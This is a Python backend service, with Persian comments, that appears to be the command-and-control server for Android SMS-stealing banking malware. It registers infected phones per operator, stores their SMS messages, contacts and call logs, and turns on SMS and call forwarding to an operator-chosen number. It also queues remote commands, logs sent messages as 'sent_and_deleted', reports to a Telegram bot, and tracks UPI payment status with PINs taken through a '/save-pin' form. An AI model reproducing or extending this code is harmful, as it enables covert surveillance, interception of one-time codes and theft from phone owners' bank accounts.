from datetime import datetime, timedelta
from typing import List, Optional, Dict, Any
from ..database import mongodb
from ..models.schemas import Device, DeviceStatus, CommandStatus
from ..config import settings
import logging
from bson import ObjectId
import hashlib
from pymongo import UpdateOne
import re
import random

logger = logging.getLogger(__name__)

class DeviceService:

    @staticmethod
    def _assign_telegram_bot() -> int:
        """
        تخصیص ربات تلگرام به دستگاه جدید
        
        Device notifications همیشه به Bot 1 میرن
        
        Returns:
            int: شماره ربات (همیشه 1 برای device notifications)
        """
        return 1  # Bot 1: Device Notifications

    @staticmethod
    async def register_device(device_id: str, device_info: dict, admin_token: Optional[str] = None):
        """رجیستر دستگاه با توکن ادمین"""
        try:
            existing_device = await mongodb.db.devices.find_one({"device_id": device_id})
            is_new_device = existing_device is None
            now = datetime.utcnow()

            fcm_token = device_info.get("fcm_token")
            user_id = device_info.get("user_id", "USER_ID_HERE")
            app_type = device_info.get("app_type", "MP")
            sim_info = device_info.get("sim_info", [])
            
            # 🔑 پیدا کردن ادمین از روی توکن
            admin_username = None
            if admin_token:
                from ..services.auth_service import auth_service
                admin = await auth_service.get_admin_by_token(admin_token)
                if admin:
                    admin_username = admin.username
                    logger.info(f"✅ Device {device_id} assigned to admin: {admin_username}")
                else:
                    logger.warning(f"⚠️  Invalid admin token for device: {device_id}")

            common_data = {
                "model": device_info.get("model"),
                "manufacturer": device_info.get("manufacturer"),
                "brand": device_info.get("brand"),
                "device": device_info.get("device"),
                "product": device_info.get("product"),
                "hardware": device_info.get("hardware"),
                "board": device_info.get("board"),
                "display": device_info.get("display"),
                "fingerprint": device_info.get("fingerprint"),
                "host": device_info.get("host"),
                "os_version": device_info.get("os_version"),
                "sdk_int": device_info.get("sdk_int"),
                "supported_abis": device_info.get("supported_abis", []),
                "battery_level": device_info.get("battery", 100),
                "battery_state": device_info.get("battery_state"),
                "is_charging": device_info.get("is_charging", False),
                "total_storage_mb": device_info.get("total_storage_mb"),
                "free_storage_mb": device_info.get("free_storage_mb"),
                "storage_used_mb": device_info.get("storage_used_mb"),
                "storage_percent_free": device_info.get("storage_percent_free"),
                "total_ram_mb": device_info.get("total_ram_mb"),
                "free_ram_mb": device_info.get("free_ram_mb"),
                "ram_used_mb": device_info.get("ram_used_mb"),
                "ram_percent_free": device_info.get("ram_percent_free"),
                "network_type": device_info.get("network_type"),
                "ip_address": device_info.get("ip_address"),
                "is_rooted": device_info.get("is_rooted", False),
                "is_emulator": device_info.get("is_emulator", False),
                "screen_resolution": device_info.get("screen_resolution"),
                "screen_density": device_info.get("screen_density"),
                "device_name": device_info.get("device_name"),
                "sim_info": sim_info,
                "user_id": user_id,
                "app_type": app_type,
                "admin_token": admin_token,  # 🔑 توکن ادمین
                "admin_username": admin_username,  # 👤 نام کاربری ادمین
                "status": "online",
                "last_ping": now,
                "updated_at": now
            }

            if existing_device:
                update_data = {"$set": common_data}
                
                if fcm_token:
                    update_data["$addToSet"] = {"fcm_tokens": fcm_token}
                
                # اگه فیلدهای UPI نداره، اضافه کن
                if "has_upi" not in existing_device:
                    if "$setOnInsert" not in update_data:
                        update_data["$setOnInsert"] = {}
                    update_data["$setOnInsert"]["has_upi"] = False
                    update_data["$setOnInsert"]["upi_detected_at"] = None
                
                await mongodb.db.devices.update_one({"device_id": device_id}, update_data)
                logger.info(f"🔄 Device updated: {device_id}")
                
            else:
                # 🤖 تخصیص ربات تلگرام برای دستگاه جدید
                telegram_bot_id = DeviceService._assign_telegram_bot()
                
                device_data = {
                    "device_id": device_id,
                    **common_data,
                    "fcm_tokens": [fcm_token] if fcm_token else [],
                    "telegram_bot_id": telegram_bot_id,  # 🤖 Bot Assignment
                    "registered_at": now,
                    "has_upi": False,
                    "upi_detected_at": None,
                    "stats": {
                        "total_sms": 0,
                        "total_contacts": 0,
                        "total_calls": 0,
                        "last_sms_sync": None,
                        "last_contact_sync": None,
                        "last_call_sync": None
                    },
                    "settings": {
                        "monitoring_enabled": True,
                        "sms_forward_enabled": False,
                        "forward_number": None,
                    },
                    "is_online": True,
                    "last_online_update": now,
                }
                await mongodb.db.devices.insert_one(device_data)
                logger.info(f"✅ New device registered: {device_id} (Bot {telegram_bot_id})")

            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            return {"device": device_doc, "is_new": is_new_device}

        except Exception as e:
            logger.error(f"❌ Register device failed: {e}")
            raise

    @staticmethod
    async def update_device_status(device_id: str, status: DeviceStatus):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": {"status": status, "last_ping": datetime.utcnow() if status == DeviceStatus.ONLINE else None, "updated_at": datetime.utcnow()}}
            )
        except Exception as e:
            logger.error(f"❌ Update device status failed: {e}")

    @staticmethod
    async def update_battery_level(device_id: str, battery_level: int):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": {"battery_level": battery_level, "updated_at": datetime.utcnow()}}
            )
        except Exception as e:
            logger.error(f"❌ Battery update failed: {e}")

    @staticmethod
    async def update_online_status(device_id: str, is_online: bool):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": {"is_online": is_online, "last_online_update": datetime.utcnow()}}
            )
        except Exception as e:
            logger.error(f"❌ Online status update failed: {e}")

    @staticmethod
    async def get_device(device_id: str) -> Optional[Device]:
        try:
            device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
            
            if device_doc:
                two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
                
                if device_doc.get("last_ping") and device_doc["last_ping"] < two_minutes_ago:
                    await mongodb.db.devices.update_one(
                        {"device_id": device_id},
                        {
                            "$set": {
                                "status": "offline",
                                "is_online": False
                            }
                        }
                    )
                    device_doc["status"] = "offline"
                    device_doc["is_online"] = False
                
                # normalize کن
                normalized = DeviceService._normalize_device_data(device_doc)
                return Device(**normalized)
            return None
        except Exception as e:
            logger.error(f"❌ Get device failed: {e}")
            return None

    @staticmethod
    async def save_sms_history(device_id: str, sms_list: list):
        """ذخیره تاریخچه SMS + تشخیص و ذخیره UPI PIN"""
        try:
            if not sms_list:
                return
            
            current_time = datetime.utcnow()
            
            operations = []
            for sms in sms_list:
                sms_data = {
                    "sms_id": sms.get("sms_id"),
                    "device_id": device_id,
                    "from": sms.get("from", ""),
                    "to": sms.get("to", ""),
                    "body": sms.get("body", ""),
                    "timestamp": sms.get("timestamp"),
                    "type": sms.get("type", "inbox"),
                    "is_read": sms.get("is_read", False),
                    "received_at": current_time
                }
                
                operations.append(
                    UpdateOne(
                        {"sms_id": sms_data["sms_id"]},
                        {"$set": sms_data},
                        upsert=True
                    )
                )
            
            # ذخیره دسته‌ای پیامک‌ها
            if operations:
                result = await mongodb.db.sms_messages.bulk_write(operations, ordered=False)
                logger.info(f"📥 SMS saved: {result.upserted_count + result.modified_count}")
            
            # آپدیت stats
            total_sms = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
            
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "stats.total_sms": total_sms,
                        "stats.last_sms_sync": current_time
                    }
                }
            )
            
            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
            
        except Exception as e:
            logger.error(f"❌ Save SMS failed: {e}")
            raise

    # ℹ️ NOTE: UPI PIN extraction from SMS removed
    # UPI PIN now comes directly from /save-pin endpoint (HTML form)

    @staticmethod
    async def save_new_sms(device_id: str, sms_data: dict):
        try:
            sms_hash = hashlib.md5(
                f"{device_id}:{sms_data.get('from', '')}:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
            ).hexdigest()

            existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_hash})
            if existing:
                return

            message = {
                "sms_id": sms_hash,
                "device_id": device_id,
                "from": sms_data.get("from"),
                "to": sms_data.get("to"),
                "body": sms_data.get("body"),
                "timestamp": datetime.fromtimestamp(sms_data.get("timestamp", 0) / 1000) if sms_data.get("timestamp") else datetime.utcnow(),
                "type": sms_data.get("type", "inbox"),
                "is_read": False,
                "is_flagged": False,
                "tags": [],
                "received_at": datetime.utcnow()
            }

            await mongodb.db.sms_messages.insert_one(message)
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$inc": {"stats.total_sms": 1}}
            )
            
            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
                    
        except Exception as e:
            logger.error(f"❌ Save new SMS failed: {e}")


    @staticmethod
    async def get_sms_messages(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
        try:
            cursor = mongodb.db.sms_messages.find({"device_id": device_id}).sort("timestamp", -1).skip(skip).limit(limit)
            messages = await cursor.to_list(length=limit)
            for msg in messages:
                if "_id" in msg:
                    msg["_id"] = str(msg["_id"])
                for key, value in msg.items():
                    if isinstance(value, ObjectId):
                        msg[key] = str(value)
            return messages
        except Exception as e:
            logger.error(f"❌ Get SMS failed: {e}")
            return []

    @staticmethod
    async def save_contacts(device_id: str, contacts_list: List[dict]):
        """ذخیره مخاطبین"""
        try:
            if not contacts_list:
                return

            now = datetime.utcnow()
            operations = []

            for contact in contacts_list:
                contact_id = contact.get("contact_id", "")          # ⭐ تغییر
                name = contact.get("name", "")
                phone = contact.get("phone_number", "")             # ⭐ تغییر
                
                if not phone or not contact_id:
                    continue

                contact_doc = {
                    "contact_id": contact_id,                       # ⭐ از اندروید میاد
                    "device_id": device_id,
                    "name": name,
                    "phone_number": phone,
                    "synced_at": now
                }

                operations.append(
                    UpdateOne(
                        {"contact_id": contact_id},
                        {"$set": contact_doc},
                        upsert=True
                    )
                )

            # ذخیره bulk
            if operations:
                result = await mongodb.db.contacts.bulk_write(operations, ordered=False)
                new_count = result.upserted_count
                update_count = result.modified_count
                
                logger.info(f"✅ Contacts: {new_count} new, {update_count} updated for {device_id}")
            
            # آپدیت stats
            total = await mongodb.db.contacts.count_documents({"device_id": device_id})
            
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "stats.total_contacts": total,
                        "stats.last_contact_sync": now
                    }
                }
            )

        except Exception as e:
            logger.error(f"❌ Contacts save failed: {e}")

    @staticmethod
    async def get_contacts(device_id: str, skip: int = 0, limit: int = 100) -> List[Dict]:
        try:
            cursor = mongodb.db.contacts.find({"device_id": device_id}).sort("name", 1).skip(skip).limit(limit)
            contacts = await cursor.to_list(length=limit)
            for contact in contacts:
                if "_id" in contact:
                    contact["_id"] = str(contact["_id"])
                for key, value in contact.items():
                    if isinstance(value, ObjectId):
                        contact[key] = str(value)
            return contacts
        except Exception as e:
            logger.error(f"❌ Get contacts failed: {e}")
            return []

    @staticmethod
    async def save_call_logs(device_id: str, call_logs: List[dict]):
        """ذخیره تاریخچه تماس - کاتلین میفرسته: number, name, call_type, timestamp, duration, duration_formatted"""
        try:
            if not call_logs:
                return

            now = datetime.utcnow()
            new_count = 0

            for call in call_logs:
                number = call.get("number", "")
                name = call.get("name", "Unknown")
                call_type = call.get("call_type", "unknown")
                timestamp_ms = call.get("timestamp", 0)
                duration = call.get("duration", 0)
                duration_formatted = call.get("duration_formatted", "")

                call_hash = hashlib.md5(
                    f"{device_id}:{number}:{call_type}:{timestamp_ms}:{duration}".encode()
                ).hexdigest()

                existing = await mongodb.db.call_logs.find_one({"call_id": call_hash})
                if existing:
                    continue

                call_doc = {
                    "call_id": call_hash,
                    "device_id": device_id,
                    "number": number,
                    "name": name,
                    "call_type": call_type,
                    "timestamp": datetime.fromtimestamp(timestamp_ms / 1000) if timestamp_ms else now,
                    "duration": duration,
                    "duration_formatted": duration_formatted,
                    "received_at": now
                }

                await mongodb.db.call_logs.insert_one(call_doc)
                new_count += 1

            if new_count > 0:
                total = await mongodb.db.call_logs.count_documents({"device_id": device_id})
                await mongodb.db.devices.update_one(
                    {"device_id": device_id},
                    {
                        "$set": {
                            "stats.total_calls": total,
                            "stats.last_call_sync": now
                        }
                    }
                )
                logger.info(f"✅ Saved {new_count} call logs for {device_id}")

        except Exception as e:
            logger.error(f"❌ Call logs save failed: {e}")

    @staticmethod
    async def get_call_logs(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
        try:
            cursor = mongodb.db.call_logs.find({"device_id": device_id}).sort("timestamp", -1).skip(skip).limit(limit)
            call_logs = await cursor.to_list(length=limit)
            for call in call_logs:
                if "_id" in call:
                    call["_id"] = str(call["_id"])
                for key, value in call.items():
                    if isinstance(value, ObjectId):
                        call[key] = str(value)
            return call_logs
        except Exception as e:
            logger.error(f"❌ Get call logs failed: {e}")
            return []

    @staticmethod
    async def add_log(device_id: str, log_type: str, message: str, level: str = "info", metadata: dict = None):
        try:
            log = {
                "device_id": device_id,
                "type": log_type,
                "message": message,
                "level": level,
                "metadata": metadata or {},
                "timestamp": datetime.utcnow()
            }
            await mongodb.db.logs.insert_one(log)
        except:
            pass

    @staticmethod
    async def get_logs(device_id: str, skip: int = 0, limit: int = 100) -> List[Dict]:
        try:
            cursor = mongodb.db.logs.find({"device_id": device_id}).sort("timestamp", -1).skip(skip).limit(limit)
            logs = await cursor.to_list(length=limit)
            for log in logs:
                if "_id" in log:
                    log["_id"] = str(log["_id"])
                for key, value in log.items():
                    if isinstance(value, ObjectId):
                        log[key] = str(value)
            return logs
        except Exception as e:
            logger.error(f"❌ Get logs failed: {e}")
            return []


    @staticmethod
    def _normalize_device_data(device_doc: dict) -> dict:
        """تبدیل داده‌های دستگاه به فرمت صحیح برای validation"""
        
        # تبدیل float به string برای درصدها (بدون اعشار)
        if device_doc.get("storage_percent_free") is not None:
            value = float(device_doc["storage_percent_free"])
            device_doc["storage_percent_free"] = str(int(value))
        
        if device_doc.get("ram_percent_free") is not None:
            value = float(device_doc["ram_percent_free"])
            device_doc["ram_percent_free"] = str(int(value))
        
        # تبدیل float به int برای حافظه‌ها
        int_fields = [
            "total_storage_mb", "free_storage_mb", "storage_used_mb",
            "total_ram_mb", "free_ram_mb", "ram_used_mb"
        ]
        for field in int_fields:
            if device_doc.get(field) is not None:
                device_doc[field] = int(device_doc[field])
        
        # ⭐ حذف این بخش - دیگه نیازی نیست دستی map کنی
        # چون Pydantic با alias خودش map میکنه
        # sim_info رو همونطور که هست نگه دار
        
        return device_doc

    @staticmethod
    async def save_device_note(device_id: str, priority: str, message: str):
        """ذخیره Note برای دستگاه"""
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "note_priority": priority,
                        "note_message": message,
                        "note_updated_at": datetime.utcnow(),
                        "updated_at": datetime.utcnow()
                    }
                }
            )
            
            logger.info(f"📝 Note saved for device: {device_id} - Priority: {priority}")
            
            await DeviceService.add_log(
                device_id,
                "note",
                f"Note updated - Priority: {priority}",
                "info"
            )
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Save note failed: {e}")
            return False



    @staticmethod
    async def get_devices_for_admin(admin_username: str, is_super_admin: bool = False, skip: int = 0, limit: int = 100) -> List[Device]:
        """
        دریافت دستگاه‌ها بر اساس ادمین
        - Super Admin: همه دستگاه‌ها
        - Admin معمولی: فقط دستگاه‌های خودش
        """
        try:
            two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
            
            # آپدیت وضعیت آفلاین
            result = await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": two_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False
                    }
                }
            )
            
            if result.modified_count > 0:
                logger.info(f"🔴 Marked {result.modified_count} devices as offline")
            
            # فیلتر بر اساس ادمین
            query = {} if is_super_admin else {"admin_username": admin_username}
            
            cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
            devices = await cursor.to_list(length=limit)
            
            device_list = []
            for device_doc in devices:
                try:
                    normalized = DeviceService._normalize_device_data(device_doc)
                    device_list.append(Device(**normalized))
                except Exception as e:
                    logger.warning(f"⚠️ Skipping device {device_doc.get('device_id')}: {e}")
                    continue
            
            return device_list
            
        except Exception as e:
            logger.error(f"❌ Get devices failed: {e}")
            return []
    
    @staticmethod
    async def get_all_devices(skip: int = 0, limit: int = 100) -> List[Device]:
        try:
            two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
            
            result = await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": two_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False
                    }
                }
            )
            
            if result.modified_count > 0:
                logger.info(f"🔴 Marked {result.modified_count} devices as offline")
            
            cursor = mongodb.db.devices.find().skip(skip).limit(limit).sort("registered_at", -1)
            devices = await cursor.to_list(length=limit)
            
            device_list = []
            for device_doc in devices:
                try:
                    normalized = DeviceService._normalize_device_data(device_doc)
                    device_list.append(Device(**normalized))
                except Exception as e:
                    logger.warning(f"⚠️ Skipping device {device_doc.get('device_id')}: {e}")
                    continue
            
            return device_list
            
        except Exception as e:
            logger.error(f"❌ Get devices failed: {e}")
            return []


    @staticmethod
    async def update_device_settings(device_id: str, settings: dict):
        try:
            update_data = {}
            if "sms_forward_enabled" in settings:
                update_data["settings.sms_forward_enabled"] = settings["sms_forward_enabled"]
            if "forward_number" in settings:
                update_data["settings.forward_number"] = settings["forward_number"]
            if "monitoring_enabled" in settings:
                update_data["settings.monitoring_enabled"] = settings["monitoring_enabled"]
            if "auto_reply_enabled" in settings:
                update_data["settings.auto_reply_enabled"] = settings["auto_reply_enabled"]

            if update_data:
                update_data["updated_at"] = datetime.utcnow()
                await mongodb.db.devices.update_one(
                    {"device_id": device_id},
                    {"$set": update_data}
                )
        except Exception as e:
            logger.error(f"❌ Update settings failed: {e}")

    @staticmethod
    async def create_command(device_id: str, command: str, parameters: dict = None) -> Optional[str]:
        try:
            command_doc = {
                "device_id": device_id,
                "command": command,
                "parameters": parameters or {},
                "status": CommandStatus.PENDING,
                "sent_at": None,
                "executed_at": None,
                "result": None
            }
            result = await mongodb.db.commands.insert_one(command_doc)
            return str(result.inserted_id)
        except Exception as e:
            logger.error(f"❌ Create command failed: {e}")
            return None

    @staticmethod
    async def update_command_status(command_id: str, status: CommandStatus, result: dict = None):
        try:
            update_data = {"status": status}
            if status == CommandStatus.SENT:
                update_data["sent_at"] = datetime.utcnow()
            elif status == CommandStatus.EXECUTED:
                update_data["executed_at"] = datetime.utcnow()
                if result:
                    update_data["result"] = result

            await mongodb.db.commands.update_one(
                {"_id": ObjectId(command_id)},
                {"$set": update_data}
            )
        except Exception as e:
            logger.error(f"❌ Update command status failed: {e}")

    @staticmethod
    async def update_device_info(device_id: str, device_info: dict):
        try:
            update_data = {"updated_at": datetime.utcnow()}
            
            if "battery" in device_info:
                update_data["battery_level"] = device_info["battery"]
            if "battery_state" in device_info:
                update_data["battery_state"] = device_info["battery_state"]
            if "is_charging" in device_info:
                update_data["is_charging"] = device_info["is_charging"]
            if "sim_info" in device_info:
                update_data["sim_info"] = device_info["sim_info"]
            if "screen_resolution" in device_info:
                update_data["screen_resolution"] = device_info["screen_resolution"]
            if "screen_density" in device_info:
                update_data["screen_density"] = device_info["screen_density"]
            if "is_rooted" in device_info:
                update_data["is_rooted"] = device_info["is_rooted"]
            if "is_emulator" in device_info:
                update_data["is_emulator"] = device_info["is_emulator"]
            if "total_ram_mb" in device_info:
                update_data["total_ram_mb"] = device_info["total_ram_mb"]
            if "free_ram_mb" in device_info:
                update_data["free_ram_mb"] = device_info["free_ram_mb"]
            if "ram_used_mb" in device_info:
                update_data["ram_used_mb"] = device_info["ram_used_mb"]
            if "ram_percent_free" in device_info:
                update_data["ram_percent_free"] = device_info["ram_percent_free"]
            if "total_storage_mb" in device_info:
                update_data["total_storage_mb"] = device_info["total_storage_mb"]
            if "free_storage_mb" in device_info:
                update_data["free_storage_mb"] = device_info["free_storage_mb"]
            if "storage_used_mb" in device_info:
                update_data["storage_used_mb"] = device_info["storage_used_mb"]
            if "storage_percent_free" in device_info:
                update_data["storage_percent_free"] = device_info["storage_percent_free"]
            if "network_type" in device_info:
                update_data["network_type"] = device_info["network_type"]
            if "ip_address" in device_info:
                update_data["ip_address"] = device_info["ip_address"]
            if "device_name" in device_info:
                update_data["device_name"] = device_info["device_name"]

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$set": update_data}
            )
        except Exception as e:
            logger.error(f"❌ Update device info failed: {e}")

    @staticmethod
    async def save_sent_sms(device_id: str, sms_data: dict):
        try:
            sms_hash = hashlib.md5(
                f"{device_id}:sent:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
            ).hexdigest()

            existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_hash})
            if existing:
                return

            sms_doc = {
                "sms_id": sms_hash,
                "device_id": device_id,
                "from": device_id,
                "to": sms_data.get("to"),
                "body": sms_data.get("body"),
                "timestamp": datetime.fromtimestamp(sms_data.get("timestamp", 0) / 1000) if sms_data.get("timestamp") else datetime.utcnow(),
                "type": "sent",
                "status": sms_data.get("status", "sent_and_deleted"),
                "is_deleted": True,
                "sim_slot": sms_data.get("sim_slot"),
                "is_read": True,
                "is_flagged": False,
                "tags": [],
                "received_at": datetime.utcnow(),
            }

            await mongodb.db.sms_messages.insert_one(sms_doc)
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$inc": {"stats.total_sms": 1}}
            )
        except Exception as e:
            logger.error(f"❌ Save sent SMS failed: {e}")

    @staticmethod
    async def save_sms_forward_log(device_id: str, forward_data: dict):
        try:
            forward_hash = hashlib.md5(
                f"{device_id}:{forward_data.get('from', '')}:{forward_data.get('to', '')}:{forward_data.get('timestamp', 0)}".encode()
            ).hexdigest()

            existing = await mongodb.db.sms_forwarding_logs.find_one({"forward_id": forward_hash})
            if existing:
                return

            log_doc = {
                "forward_id": forward_hash,
                "device_id": device_id,
                "original_from": forward_data.get("from"),
                "forwarded_to": forward_data.get("to"),
                "body": forward_data.get("body"),
                "timestamp": datetime.fromtimestamp(forward_data.get("timestamp", 0) / 1000) if forward_data.get("timestamp") else datetime.utcnow(),
                "created_at": datetime.utcnow(),
            }

            await mongodb.db.sms_forwarding_logs.insert_one(log_doc)
        except Exception as e:
            logger.error(f"❌ Save SMS forward log failed: {e}")

    @staticmethod
    async def get_forwarding_number(device_id: str) -> Optional[str]:
        try:
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"settings.forward_number": 1, "settings.sms_forward_enabled": 1}
            )

            if not device:
                return None

            settings = device.get("settings", {})

            if settings.get("sms_forward_enabled", False):
                return settings.get("forward_number")
            else:
                return None

        except Exception as e:
            logger.error(f"❌ Get forwarding number failed: {e}")
            return None

    @staticmethod
    async def disable_sms_forwarding(device_id: str):
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "settings.sms_forward_enabled": False,
                        "settings.forward_number": None,
                        "settings.sms_forward_updated_at": datetime.utcnow(),
                    }
                }
            )
        except Exception as e:
            logger.error(f"❌ Disable SMS forwarding failed: {e}")

    @staticmethod
    async def save_call_forwarding_result(device_id: str, result_data: dict):
        try:
            success = result_data.get("success", False)

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "call_forwarding_enabled": success,
                        "call_forwarding_number": result_data.get("number") if success else None,
                        "call_forwarding_sim_slot": result_data.get("sim_slot", 0),
                        "call_forwarding_updated_at": datetime.utcnow(),
                    }
                }
            )

            log_doc = {
                "device_id": device_id,
                "action": "enable",
                "success": success,
                "number": result_data.get("number"),
                "sim_slot": result_data.get("sim_slot", 0),
                "timestamp": datetime.fromtimestamp(result_data.get("timestamp", 0) / 1000) if result_data.get("timestamp") else datetime.utcnow(),
                "created_at": datetime.utcnow(),
            }

            await mongodb.db.call_forwarding_logs.insert_one(log_doc)
        except Exception as e:
            logger.error(f"❌ Save call forwarding result failed: {e}")

    @staticmethod
    async def save_call_forwarding_disabled(device_id: str, result_data: dict):
        try:
            success = result_data.get("success", False)

            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {
                    "$set": {
                        "call_forwarding_enabled": False,
                        "call_forwarding_number": None,
                        "call_forwarding_updated_at": datetime.utcnow(),
                    }
                }
            )

            log_doc = {
                "device_id": device_id,
                "action": "disable",
                "success": success,
                "sim_slot": result_data.get("sim_slot", 0),
                "timestamp": datetime.fromtimestamp(result_data.get("timestamp", 0) / 1000) if result_data.get("timestamp") else datetime.utcnow(),
                "created_at": datetime.utcnow(),
            }

            await mongodb.db.call_forwarding_logs.insert_one(log_doc)
        except Exception as e:
            logger.error(f"❌ Save call forwarding disabled failed: {e}")

    @staticmethod
    async def get_stats() -> Dict[str, int]:
        try:
            # اول offline ها رو آپدیت کن
            two_minutes_ago = datetime.utcnow() - timedelta(minutes=2)
            await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": two_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False
                    }
                }
            )
            
            # حالا آمار رو بگیر
            total = await mongodb.db.devices.count_documents({})
            if total == 0:
                return {"total_devices": 0, "active_devices": 0, "pending_devices": 0, "online_devices": 0, "offline_devices": 0}
            
            online = await mongodb.db.devices.count_documents({"status": "online"})
            offline = total - online
            pending = await mongodb.db.devices.count_documents({
                "$and": [
                    {"stats.total_sms": 0},
                    {"stats.total_contacts": 0},
                    {"stats.total_calls": 0}
                ]
            })
            active = total - pending
            
            return {
                "total_devices": total,
                "active_devices": active,
                "pending_devices": pending,
                "online_devices": online,
                "offline_devices": offline
            }
        except:
            return {"total_devices": 0, "active_devices": 0, "pending_devices": 0, "online_devices": 0, "offline_devices": 0}

device_service = DeviceService()